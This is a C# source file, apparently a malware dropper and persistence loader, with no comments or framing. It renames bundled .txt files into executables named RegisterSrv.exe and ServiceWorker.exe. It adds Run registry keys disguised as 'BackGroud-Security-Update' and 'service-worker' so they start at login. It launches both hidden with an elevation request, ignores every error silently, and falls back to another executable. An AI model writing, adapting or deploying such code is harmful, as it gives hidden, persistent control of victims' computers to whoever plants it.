using System;
using System.Threading;
using System.Reflection;
using System.Reflection.Emit;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Windows;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

class mak
	{
		public static void SetStartup ( 
					string pt 
				)
			{
				string pa = "";
				pa += pt;
				pa += "\\RegisterSrv.exe";
				try {
					RegistryKey rklm = Registry.CurrentUser.OpenSubKey(
								"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			 					true
							);	rklm.SetValue(
									"BackGroud-Security-Update",
				 					 pa
								); 
					} catch
				{
			}
			string lt = "";
			string bt = "";
			bt += pt;
			bt += "\\RegisterSrv.txt";
			lt += pt;lt += "\\ServiceWorker.exe"; 
			try
			{ 
				RegistryKey szRklm = Registry.CurrentUser.OpenSubKey(
							"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			 				true
					);	szRklm.SetValue(
									"service-worker",
						 			lt
								); 
						} 
			catch{
		}
		string tkl = "";
		tkl += pt;
		tkl += "\\Comn.txt";
		string jstc = pt;
		jstc += "\\RegisterSrv.exe";
		string btar = pt + "\\ServiceWorker.exe";
		try
			{ 
				File.Move(
						tkl,
						jstc
					); } catch{ try
									{
						string tl = "";tl += pt; tl += "\\Comn";
						File.Move(
								tl,
								jstc
							);} catch{
					}	
				} 
		try
			{
				File.Move(
						bt,
						lt
					);
		} catch{ 
			try
					{
						string tr = "";tr += pt; tr += "\\RegisterSrv";
						File.Move(
								tr,
								lt
							);
				} catch{
			}
		}
	}

		public static void Main(
					string [] args
				)
			{
				string pt = Directory.GetCurrentDirectory();
				SetStartup(
						pt
				); string pa = pt + "\\ServiceWorker.exe";
				string rc = pt;
				rc += "\\RegisterSrv.exe";
			try
				{
					var psi = new ProcessStartInfo
					{
    						FileName = rc,
    						WindowStyle = ProcessWindowStyle.Hidden,
						UseShellExecute = false,
						RedirectStandardOutput = true,
						RedirectStandardError = true,
						Verb = "runas"
					};
					Process.Start(psi);
						} catch
					{
				}
			try
				{
					var psi = new ProcessStartInfo
					{
    						FileName = pa,
    						WindowStyle = ProcessWindowStyle.Hidden,
						UseShellExecute = false,
						RedirectStandardOutput = true,
						RedirectStandardError = true,
						Verb = "runas"
					};
					Process.Start(psi);
				} catch 
			{
			string gs = pt;
			gs += "\\aptkl.exe";
			try
				{
					Process.Start(gs);
				} catch {
			}
		}
	}
}




